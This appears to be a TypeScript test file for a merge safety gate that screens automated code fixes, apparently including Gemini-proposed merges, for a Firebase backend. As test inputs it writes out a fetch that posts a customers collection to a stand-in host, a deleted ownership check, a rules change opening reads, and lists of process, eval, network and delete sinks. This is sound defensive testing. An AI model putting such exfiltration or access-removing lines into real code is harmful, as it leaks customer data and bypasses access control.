    ["a money decision", "  if (order.amount > 0) charge(order);", "excluded:money"],
    ["a secret compared", "  if (signature !== expected) throw new Error(\"bad\");", "excluded:secrets"],
  ])("refuses the guard when the function holds %s outside the hunk", (_name, line2, problem) => {
    const r = withBase(line2);
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain(problem);
  });

  it("judges only the enclosing function: a check in another function of the file does not count", () => {
    expect(after(["export function isOwner(doc: Doc, uid: string): boolean {", "  return doc.ownerId === uid;", "}", ""])).toMatchObject({ allowed: true });
    expect(after(["export const isOwner = (doc: Doc, uid: string): boolean => {", "  return doc.ownerId === uid;", "};", ""])).toMatchObject({ allowed: true });
  });

  it("judges the whole file when it cannot delimit the function for certain", () => {
    for (const odd of ["const s = 'unterminated", "const r = /unterminated", "const t = `${"]) {
      const r = after(["export function isOwner(doc: Doc, uid: string): boolean {", "  return doc.ownerId === uid;", "}", odd]);
      expect(r.allowed, odd).toBe(false);
      expect(r.problems, odd).toContain("excluded:access-control");
    }
  });

  it("refuses with no base content (fail closed), and when the base does not hold the hunk's lines", () => {
    expect(gate(patch, { baseFiles: new Map() })).toMatchObject({ allowed: false, problems: expect.arrayContaining(["base-not-available"]) });
    expect(gate(patch, { baseFiles: undefined })).toMatchObject({ allowed: false, problems: expect.arrayContaining(["base-not-available"]) });
    expect(gate(patch, { baseFiles: new Map([[FILE, base("  const z = 0;").replace("const meta = doc.meta", "const meta = doc.other")]]) })).toMatchObject({ allowed: false, problems: expect.arrayContaining(["base-mismatch"]) });
  });

  it("refuses a hunk with fewer than 3 lines of context on a side, unless that side is the file's start or end", () => {
    const thin = diff(FILE, ["   const c = 3;", "   const meta = doc.meta;", "+  if (meta == null) return null;", "   log(meta);"], false).replace("@@ -1,", "@@ -5,").replace(" +1,", " +5,");
    expect(gate(thin, { baseFiles: new Map([[FILE, base("  const z = 0;")]]) })).toMatchObject({ allowed: false, problems: expect.arrayContaining(["too-little-context"]) });
    // The helpers' hunks start at line 1 and end with the file: less context is all there is.
    expect(gate(guard)).toMatchObject({ allowed: true });
  });

  it("keeps the demo's CODE-01 fix allowed, judged against the fixture's real handler", () => {
    const fixture = JSON.parse(readFileSync(new URL("../../fixtures/incidents/firestore-undefined-field.json", import.meta.url), "utf8")) as { context: { path: string; excerpt: string }[] };
    const { path, excerpt } = fixture.context[0]!;
    const lines = excerpt.split("\n");
    const at = lines.findIndex((l) => l.trim() === "couponCode: input.couponCode,");
    expect(at).toBeGreaterThan(3);
    const hunk = [
      ...lines.slice(at - 3, at).map((l) => ` ${l}`),
      `-${lines[at]!}`,
      "+    ...(input.couponCode !== undefined && { couponCode: input.couponCode }),",
      ...lines.slice(at + 1, at + 4).map((l) => ` ${l}`),
    ];
    const fix = diff(path, hunk, false).replace("@@ -1,", `@@ -${at - 2},`).replace(" +1,", ` +${at - 2},`);
    expect(gate(fix, { baseFiles: new Map([[path, excerpt + "\n"]]) })).toMatchObject({ allowed: true, fixClass: "firestore-undefined-field", problems: [] });
  });
});

describe("assessBlastRadius: an added guard is a statement of its own (review of #238)", () => {
  const at = (before: string[], after: string[]) => gate(diff(SRC, [...before, "+  if (data.items == null) return null;", ...after]));
  it.each([
    // The review's proof: the guard becomes the `if`'s body, and `push` runs for everyone.
    ["a braceless if", ['   if (user.plan === "pro")'], ['     features.push("export");']],
    ["an else", ["   if (user.plan) x();", "   else"], ['     features.push("export");']],
    ["a braceless for", ["   for (const f of list)"], ["     f.run();"]],
    ["a braceless while", ["   while (queue.length > 0)"], ["     queue.pop();"]],
    ["a do", ["   do"], ["     queue.pop();", "   while (queue.length > 0);"]],
    ["a label", ["   outer:"], ["   for (const f of list) f.run();"]],
    ["a case", ["   switch (kind) {", '   case "a":'], ["     run();"]],
    ["a line that does not end a statement", ["   const total = items.length +"], ["     extra;"]],
    ["a braceless if behind a blank line and a comment", ['   if (user.plan === "pro")', " ", "   // the export"], ['     features.push("export");']],
  ])("refuses a guard after %s", (_name, before, after) => {
    const r = at(before, after);
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("not-an-allowed-class");
  });

  it("refuses a guard an `else` would attach to", () => {
    const r = gate(diff(SRC, ["  if (user.plan) x();", "+  if (data.items == null) return null;", "   else y();"]));
    expect(r.allowed).toBe(false);
  });

  it("refuses a guard when the hunk shows no line before it and does not start the file", () => {
    const blankLead = ["--- a/src/x.ts", "+++ b/src/x.ts", "@@ -4,6 +4,7 @@", " ", " // a", " ", "+  if (data == null) return;", "   run(data);", "   run(data);", "   run(data);"].join("\n") + "\n";
    const base = ["export function f(data) {", "  run(data);", "  run(data);", "", "// a", "", "  run(data);", "  run(data);", "  run(data);", "}"].join("\n") + "\n";
    expect(gate(blankLead, { baseFiles: new Map([["src/x.ts", base]]) }).problems).toContain("not-an-allowed-class");
  });

  it("still allows a guard after a statement, a block's start or end, and after a comment that follows one", () => {
    expect(at(["   const x = 1;"], ["   return x;"]).allowed).toBe(true);
    expect(at(["   if (x) {", "     y();", "   }"], ["   return x;"]).allowed).toBe(true);
    expect(at(["   const x = 1;", "   // the items"], ["   return x;"]).allowed).toBe(true);
  });
});

describe("assessBlastRadius: a check written as a call (review of #202)", () => {
  it("refuses a guard above an access check that decides by throwing, not by comparing", () => {
    // The review's proof: no if, return, throw or comparison on these lines, and still they are the check.
    const r = gate(diff(SRC, ["  const doc = await load(id);", "+  if (doc.meta == null) return;", "   await requireAdmin(context);", "   await assertIsOwner(context.uid, doc);"]));
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("excluded:access-control");
  });

  it.each(["await assertCanRead(req.user, doc);", "checkAccess(user, doc);", "ensureMember(team, user);", "verifyRequest(req);", "const ok = canEdit(user, doc);", "requireUid(req);"])(
    "refuses a guard in a function that calls `%s` anywhere",
    (call) => {
      const FILE = "functions/src/docs/read.ts";
      const base = ["export async function read(id, user, doc, req, team) {", `  ${call}`, "  const a = 1;", "  const b = 2;", "  const c = 3;", "  const meta = doc.meta;", "  log(meta);", "  const d = 4;", "  const e = 5;", "  const f = 6;", "  return meta;", "}"].join("\n") + "\n";
      const hunk = ["--- a/" + FILE, "+++ b/" + FILE, "@@ -4,6 +4,7 @@", "   const b = 2;", "   const c = 3;", "   const meta = doc.meta;", "+  if (meta == null) return null;", "   log(meta);", "   const d = 4;", "   const e = 5;"].join("\n") + "\n";
      const r = gate(hunk, { baseFiles: new Map([[FILE, base]]) });
      expect(r.allowed).toBe(false);
      expect(r.problems).toContain("excluded:access-control");
    }
  );

  it("does not take `cancel` or `scanner` for a check", () => {
    expect(excludedLineCategories("cancelOrder(id);")).toEqual([]);
    expect(excludedLineCategories("const scanner = makeScanner();")).toEqual([]);
  });
});

describe("assessBlastRadius: a class judges code, never the inside of a string, regex or comment (review of #239)", () => {
  it.each([
    ["`?.` inside a string", '-  log("orders.hold");', '+  log("orders?.hold");'],
    ["`?.` inside a regular expression", "-  const re = /a.b/;", "+  const re = /a?.b/;"],
    ["`?.` inside a comment", "-  x(); // a.b", "+  x(); // a?.b"],
    ["`await` inside a string", '-  run("(save())");', '+  run("(await save())");'],
    ["`?? null` inside a template", "-  log(`a.b`);", "+  log(`a?.b ?? null`);"],
  ])("refuses %s", (_name, minus, plus) => {
    const r = gate(diff(SRC, ["  const o = get(id);", minus, plus, "   return o;"]));
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("not-an-allowed-class");
  });

  it("refuses a `?.` that would skip a call: the chain short-circuits it, and the function goes on", () => {
    for (const [minus, plus] of [
      ['-  flags.isOn("orders.hold");', '+  flags?.isOn("orders.hold");'],
      ["-  order.items.push(item);", "+  order?.items.push(item);"],
      ["-  ref.update(data);", "+  ref?.update(data);"],
      ["-  hooks.onSave(order);", "+  hooks.onSave?.(order);"],
    ]) {
      expect(gate(diff(SRC, ["  const o = get(id);", minus!, plus!, "   return o;"])).allowed, plus).toBe(false);
    }
  });

  it("still allows `?.` on a read, a string left as it is beside it, and `await` before a call", () => {
    expect(gate(diff(SRC, ["  const o = get(id);", '-  const n = f(o.items.length, "a.b");', '+  const n = f(o.items?.length ?? null, "a.b");', "   return n;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const ref = doc(id);", '-  ref.set({ s: "x" });', '+  await ref.set({ s: "x" });', "   return ref.id;"])).allowed).toBe(true);
  });
});

describe("isTestPath and testOnlyPatch", () => {
  it("knows a test file by its path", () => {
    expect(isTestPath("a/b.test.ts")).toBe(true);
    expect(isTestPath("a/b.spec.jsx")).toBe(true);
    expect(isTestPath("test/b.ts")).toBe(true);
    expect(isTestPath("src/__tests__/b.ts")).toBe(true);
    expect(isTestPath("src/attest.ts")).toBe(false);
    expect(isTestPath("src/contest/b.ts")).toBe(false);
  });

  it("is exactly the test files' part of the patch, and parses on its own", () => {
    const only = testOnlyPatch(guard + addedTest)!;
    expect(only).toBe(addedTest);
    expect(parsePatch(only)!.map((f) => f.newPath)).toEqual([TEST]);
  });

  it("is null with no test file, with only test files, or for a patch it does not understand", () => {
    expect(testOnlyPatch(guard)).toBeNull();
    expect(testOnlyPatch(addedTest)).toBeNull();
    expect(testOnlyPatch("garbage")).toBeNull();
  });
});

describe("judgedTheVerifiedFiles (#200)", () => {
  it("holds only when gate 1's files are exactly the files the verify gate saw change", () => {
    const r = gate(guard + addedTest);
    expect(judgedTheVerifiedFiles(r, [TEST, SRC])).toBe(true);
    expect(judgedTheVerifiedFiles(r, [SRC, TEST, "functions/src/inventory.ts"])).toBe(false); // git wrote a file gate 1 never read
    expect(judgedTheVerifiedFiles(r, [SRC])).toBe(false);
    expect(judgedTheVerifiedFiles(r, [])).toBe(false);
    expect(judgedTheVerifiedFiles({ testFiles: [] }, [])).toBe(false);
  });
});

describe("assessMergeFloor: the safety floor under every merge Gemini decides", () => {
  const floor = (patch: string, over: Partial<BlastRadiusConfig> = {}) => assessMergeFloor(patch, { excludedPaths: [], baseFiles: basesOf(patch), ...over });
  /**
   * A change gate 1 refuses for its shape alone: no allowed class, larger than its limits. It removes no deciding line
   * and calls only what the handler already calls (`load`, `log`), so the floor lets it through.
   */
  const rewrite = diff(SRC, [
    "  const order = await load(id);",
    "+  const parent = await load(data.parentId);",
    "+  if (parent == null) return null;",
    "+  const items = order.items ?? [];",
    "+  const parentItems = parent.items ?? [];",
    "+  const merged = [...items, ...parentItems];",
    "+  log(\"items\", merged.length);",
    "+  const first = merged[0];",
    "+  const label = first?.name ?? null;",
    "+  log(\"label\", label);",
    "   return order.total;",
  ]);

  it("allows what gate 1 allows, and changes gate 1 refuses only for their shape", () => {
    for (const p of [guard, missingAwait, undefinedField, guard + addedTest]) expect(floor(p)).toMatchObject({ allowed: true, sourceFile: SRC, problems: [] });
    expect(gate(rewrite).allowed).toBe(false);
    expect(floor(rewrite)).toMatchObject({ allowed: true, sourceFile: SRC });
  });

  it("allows more than one hunk in the one file", () => {
    const base = ["export function a(x) {", "  return x.total;", "}", "", "", "", "", "", "export function b(y) {", "  return y.total;", "}"].join("\n") + "\n";
    const two = [
      `--- a/${SRC}`,
      `+++ b/${SRC}`,
      "@@ -1,3 +1,4 @@",
      " export function a(x) {",
      "+  if (x == null) return null;",
      "   return x.total;",
      " }",
      "@@ -9,3 +10,4 @@",
      " export function b(y) {",
      "+  if (y == null) return null;",
      "   return y.total;",
      " }",
      "",
    ].join("\n");
    expect(floor(two, { baseFiles: new Map([[SRC, base]]) })).toMatchObject({ allowed: true });
  });

  it.each([
    ["an existing test file changed", diff(TEST, ["  const x = 1;", "-  expect(x).toBe(2);", "+  expect(x).toBe(1);", "   done();"])],
    ["a second production file", guard + diff("functions/src/orders/other.ts", ["  const a = 1;", "+  if (a == null) return null;", "   return a;"])],
    ["a security rules file", diff("firestore.rules", ["  match /orders/{id} {", "-    allow read: if false;", "+    allow read: if true;", "  }"])],
    ["a dependency change", diff("package.json", ["  \"dependencies\": {", "-    \"x\": \"1.0.0\",", "+    \"x\": \"2.0.0\",", "  }"])],
    ["an auth line", diff(SRC, ["  const order = await load(id);", "-  if (!context.auth) throw new Error(\"x\");", "+  if (context.auth == null) return null;", "   return order.total;"])],
    ["a money path", diff("functions/src/billing/charge.ts", ["  const order = await load(id);", "+  if (order == null) return null;", "   return order.total;"])],
    ["a new import", diff(SRC, ["  const order = await load(id);", "+  const fs = require(\"fs\");", "   return order.total;"])],
    ["a path the deployment excludes", guard, { excludedPaths: ["functions/src/orders/"] }],
  ])("refuses %s", (_name, patch, over?: Partial<BlastRadiusConfig>) => {
    const r = floor(patch, over ?? {});
    expect(r.allowed).toBe(false);
    expect(r.problems.length).toBeGreaterThan(0);
  });

  it("refuses when the function around the change decides access, money or a secret, however far from the change", () => {
    const FILE = "functions/src/docs/read.ts";
    const base = ["export function read(doc, user) {", "  if (doc.ownerId !== user.uid) return \"not yours\";", "  const a = 1;", "  const meta = doc.meta;", "  log(meta);", "  return null;", "}"].join("\n") + "\n";
    const patch = [`--- a/${FILE}`, `+++ b/${FILE}`, "@@ -4,2 +4,3 @@", "   const meta = doc.meta;", "+  if (meta == null) return null;", "   log(meta);", ""].join("\n");
    expect(floor(patch, { baseFiles: new Map([[FILE, base]]) }).problems).toContain("excluded:access-control");
  });

  it("refuses without the base file, or when the base does not hold the hunk: unsure is never allowed", () => {
    expect(floor(guard, { baseFiles: new Map() }).problems).toContain("base-not-available");
    expect(floor(guard, { baseFiles: new Map([[SRC, "something else\n"]]) }).problems).toContain("base-mismatch");
    expect(floor("not a diff").problems).toContain("diff-not-understood");
    expect(floor(guard.replace("return null;", "return null;\u2028")).problems).toContain("control-characters");
  });
});

describe("assessMergeFloor: what the changed code does, not only the words it uses (#295)", () => {
  const floor = (patch: string, over: Partial<BlastRadiusConfig> = {}) => assessMergeFloor(patch, { excludedPaths: [], baseFiles: basesOf(patch), ...over });
  const ORDERS = "functions/src/orders.ts";

  it("refuses the deleted ownership check the issue reported (it names no hard-exclude word)", () => {
    const base = [
      'import { db } from "./firebase";',
      "",
      "export const getOrder = onCall(async (req) => {",
      '  const snap = await db.collection("orders").doc(req.data.id).get();',
      "  const order = snap.data();",
      '  if (order.createdBy !== req.user.id) throw new HttpsError("not-found", "No such order");',
      "  return order.items;",
      "});",
    ].join("\n") + "\n";
    const patch = [
      `--- a/${ORDERS}`,
      `+++ b/${ORDERS}`,
      "@@ -4,5 +4,4 @@",
      '   const snap = await db.collection("orders").doc(req.data.id).get();',
      "   const order = snap.data();",
      '-  if (order.createdBy !== req.user.id) throw new HttpsError("not-found", "No such order");',
      "   return order.items;",
      " });",
      "",
    ].join("\n");
    const r = floor(patch, { baseFiles: new Map([[ORDERS, base]]) });
    expect(r.allowed).toBe(false);
    expect(r.problems).toEqual(expect.arrayContaining(["removes-a-decision", "removes-a-call"]));
  });

  it("refuses the null guard with a request that posts a collection away, as the issue reported", () => {
    const base = [
      'import { db } from "./firebase";',
      "",
      "export async function getOrder(id: string) {",
      '  const snap = await db.collection("orders").doc(id).get();',
      "  const order = snap.data();",
      "  return order.items;",
      "}",
    ].join("\n") + "\n";
    const patch = [
      `--- a/${ORDERS}`,
      `+++ b/${ORDERS}`,
      "@@ -3,5 +3,7 @@",
      " export async function getOrder(id: string) {",
      '   const snap = await db.collection("orders").doc(id).get();',
      "   const order = snap.data();",
      "+  if (order == null) return null;",
      '+  await fetch("https://collector.example/o", { method: "POST", body: JSON.stringify(await db.collection("customers").get().then((q) => q.docs.map((d) => d.data()))) });',
      "   return order.items;",
      " }",
      "",
    ].join("\n");
    const r = floor(patch, { baseFiles: new Map([[ORDERS, base]]) });
    expect(r.allowed).toBe(false);
    expect(r.problems).toEqual(expect.arrayContaining(["adds-sink:network", "adds-url", "adds-a-new-call"]));
  });

  describe("still allows the fixes the floor was built for", () => {
    const awaitReturn = diff(SRC, ['  const ref = db.collection("orders").doc(id);', "-  return ref.set(data);", "+  return await ref.set(data);", "   // written"]);
    const chainedReturn = diff(SRC, ["  const order = await load(id);", "-  return order.items.length;", "+  return order?.items?.length ?? null;", "   // done"]);
    const throwsError = diff(SRC, ["  const order = await load(id);", '+  if (order == null) throw new Error("no such order");', "   return order.total;"]);
    const callsPure = diff(SRC, ["  const order = await load(id);", "+  if (!Array.isArray(order.items)) return null;", "+  const n = Number(order.count ?? 0);", '+  log("count", String(n));', "   return order.total;"]);
    it.each([
      ["a null guard", guard],
      ["a guard written as a block", guardBlock],
      ["optional chaining and `?? null`", chaining],
      ["a missing await", missingAwait],
      ["a missing await on a returned call (a deciding line rewritten as itself, guarded)", awaitReturn],
      ["`?.` on a returned value", chainedReturn],
      ["a Firestore undefined field, spread", undefinedField],
      ["a Firestore undefined field, `?? null`", coalesceNull],
      ["a guard that throws a standard error", throwsError],
      ["pure conversions and checks the base never calls", callsPure],
      ["a null guard with a new test file", guard + addedTest],
    ])("%s", (_name, patch) => {
      expect(floor(patch)).toMatchObject({ allowed: true, problems: [] });
    });

    it("a guard that throws the error class the handler already throws", () => {
      const p = diff(SRC, ['  if (data == null) throw new HttpsError("invalid-argument", "no data");', "  const order = await load(id);", '+  if (order == null) throw new HttpsError("not-found", "no such order");', "   return order.total;"]);
      expect(floor(p)).toMatchObject({ allowed: true, problems: [] });
    });
  });

  describe("a removed line that decides or steers", () => {
    it.each([
      ["a guard", ["  const order = await load(id);", '-  if (order.state === "closed") return null;', "   return order.total;"]],
      ["a return", ["  const order = await load(id);", "-  return order.total;", "   // done"]],
      ["a throw", ["  const order = await load(id);", '-  throw new Error("stop");', "   // done"]],
      ["one side of a condition", ["  const order = await load(id);", "-  const ok = order.open &&", "-    order.paidAt != null;", "+  const ok = order.open;", "   return ok;"]],
      ["the brace that closes a block", ["  if (order.open) {", "    ship(order);", "-  }", '   log("x", id);', "+  }"]],
      ["a deciding line rewritten into another decision", ["  const order = await load(id);", "-  if (order.count > 1) return null;", "+  if (order.count > 2) return null;", "   return order.total;"]],
      ["a `?.` taken away", ["  const order = await load(id);", "-  const n = order?.items;", "+  const n = order.items;", "   return n;"]],
    ])("refuses %s", (_name, body) => {
      expect(floor(diff(SRC, body))).toMatchObject({ allowed: false, problems: expect.arrayContaining(["removes-a-decision"]) });
    });

    it("refuses a call taken out of the file, a check written as a call among them", () => {
      expect(floor(diff(SRC, ["  const order = await load(id);", "-  record(order);", "   return order.total;"])).problems).toContain("removes-a-call");
    });
  });

  describe("added code that reaches a sink, whether or not the base already does", () => {
    it.each([
      ["network", "  await fetch(target);"],
      ["network", "  https.get(target, done);"],
      ["network", "  await axios.post(target, order);"],
      ["network", "  const x = new XMLHttpRequest();"],
      ["network", "  const ws = new WebSocket(target);"],
      ["network", "  net.connect(port, host);"],
      ["dynamic-code", '  globalThis["fet" + "ch"](target);'],
      ["process", "  exec(command);"],
      ["process", '  spawn("sh", args);'],
      ["process", "  child_process.execSync(command);"],
      ["dynamic-code", "  eval(source);"],
      ["dynamic-code", "  const f = new Function(source);"],
      ["dynamic-code", "  order.constructor.constructor(source)();"],
      ["destructive", "  await ref.delete();"],
      ["destructive", "  await db.recursiveDelete(ref);"],
      ["destructive", "  await deleteDoc(ref);"],
      ["destructive", "  batch.delete(ref);"],
      ["filesystem", "  fs.writeFileSync(path, body);"],
      ["filesystem", "  await unlink(path);"],
    ])("refuses %s: %s", (kind, line) => {
      // The base already makes the same call: a sink is refused all the same.
      const p = diff(SRC, [` ${line}`, "  const order = await load(id);", `+${line}`, "   return order.total;"]);
      expect(floor(p)).toMatchObject({ allowed: false, problems: expect.arrayContaining([`adds-sink:${kind}`]) });
    });

    it("refuses a sink in a new test file too: once merged it runs in the target's CI", () => {
      const test = addedTest.replace("+});", "+  await fetch(target);\n+});").replace("@@ -0,0 +1,3 @@", "@@ -0,0 +1,4 @@");
      expect(floor(guard + test).problems).toContain("adds-sink:network");
    });

    it("lets a new test file fail by `process.exit(1)`, never production code", () => {
      const test = addedTest.replace("+});", "+  if (x !== null) process.exit(1);\n+});").replace("@@ -0,0 +1,3 @@", "@@ -0,0 +1,4 @@");
      expect(floor(guard + test)).toMatchObject({ allowed: true, problems: [] });
      expect(floor(diff(SRC, ["  const order = await load(id);", "+  if (order == null) process.exit(1);", "   return order.total;"])).problems).toContain("adds-sink:process");
    });

    it("passes the plain-JavaScript fixes the loop's emulator suite takes to a merge candidate", () => {
      const FILE = "functions/src/orders/createOrder.js";
      const TFILE = "functions/src/orders/createOrder.test.js";
      const base = "function get(o) {\n  const x = o;\n  return x.total;\n}\nmodule.exports = { get };\n";
      const test = [`diff --git a/${TFILE} b/${TFILE}`, "new file mode 100644", "--- /dev/null", `+++ b/${TFILE}`, "@@ -0,0 +1,2 @@", '+const { get } = require("./createOrder.js");', "+if (get(undefined) !== null) process.exit(1);"];
      const fix = (guardLine: string) => [`--- a/${FILE}`, `+++ b/${FILE}`, "@@ -1,5 +1,6 @@", " function get(o) {", "   const x = o;", `+${guardLine}`, "   return x.total;", " }", " module.exports = { get };", ...test, ""].join("\n");
      for (const g of ["  if (x == null) return null;", "  if (!x) return null;"]) expect(assessMergeFloor(fix(g), { excludedPaths: [], baseFiles: new Map([[FILE, base]]) })).toMatchObject({ allowed: true, problems: [] });
    });
  });

  describe("added code that calls what the base file never does", () => {
    it.each([
      ["a function the base never calls", "+  await notify(order);", "adds-a-new-call"],
      ["a function the base never calls, inside a call it does make", '+  log("x", notify(order));', "adds-a-new-call"],
      ["a method the base never calls", "+  const label = order.name.toUpperCase();", "adds-a-new-call"],
      ["console (a value written to the log is not a fix)", "+  console.log(order);", "adds-a-new-call"],
      ["a constructor the base never uses", "+  const seen = new Map();", "adds-a-new-call"],
      ["a tagged template", "+  const q = sql`select 1`;", "adds-a-new-call"],
      ["a call of something that is not a name", "+  handlers[order.kind](order);", "adds-a-computed-call"],
      ["a call of a call's result", "+  load(id)(order);", "adds-a-computed-call"],
      ["a new binding for a name the base calls", "+  const load = order.loader;", "rebinds-a-called-name"],
      ["a new binding for a pure call", "+  const String = order.loader;", "rebinds-a-called-name"],
      ["an arrow parameter named like a call the base makes", "+  [order.loader].map((log) => log(id));", "rebinds-a-called-name"],
    ])("refuses %s", (_name, line, problem) => {
      const p = diff(SRC, ["  const order = await load(id);", line, "   return order.total;"]);
      expect(floor(p)).toMatchObject({ allowed: false, problems: expect.arrayContaining([problem]) });
    });

    it("judges the base's calls on its code: a call named only in its strings or comments does not count", () => {
      const p = diff(SRC, ['  const note = "notify(order)"; // notify(order)', "  const order = await load(id);", "+  await notify(order);", "   return order.total;"]);
      expect(floor(p).problems).toContain("adds-a-new-call");
    });

    it("refuses an added line it cannot read for certain", () => {
      expect(floor(diff(SRC, ["  const order = await load(id);", "+  const s = `start", "   return order.total;"])).problems).toContain("added-line-not-understood");
    });
  });

  it("refuses an address added anywhere in a line", () => {
    for (const line of ['+  const target = "https://collector.example/o";', "+  const target = `ftp://${id}`;", "+  // see http://example.com"]) {
      expect(floor(diff(SRC, ["  const order = await load(id);", line, "   return order.total;"])).problems).toContain("adds-url");
    }
  });

  it("refuses more than 40 changed lines in the production file", () => {
    const many = (n: number) => diff(SRC, ["  const order = await load(id);", ...Array.from({ length: n }, (_, k) => `+  log("step", ${k});`), "   return order.total;"]);
    expect(floor(many(40))).toMatchObject({ allowed: true });
    expect(floor(many(41))).toMatchObject({ allowed: false, problems: ["change-too-large"] });
  });
});
